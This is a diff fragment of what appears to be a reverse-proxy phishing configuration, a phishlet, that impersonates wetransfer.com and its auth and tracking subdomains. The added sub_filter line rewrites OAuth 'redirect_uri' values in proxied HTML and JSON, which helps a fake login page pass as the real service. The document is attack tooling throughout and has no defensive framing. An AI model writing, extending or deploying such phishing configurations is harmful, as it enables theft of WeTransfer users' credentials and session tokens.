@@ -15,6 +15,7 @@ proxy_hosts:
 sub_filters:
   - {triggers_on: 'wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: 'redirect_uri="https://{hostname}', replace: 'redirect_uri="https://wetransfer.com', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'wetransfer.com', orig_sub: 'snowplow', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
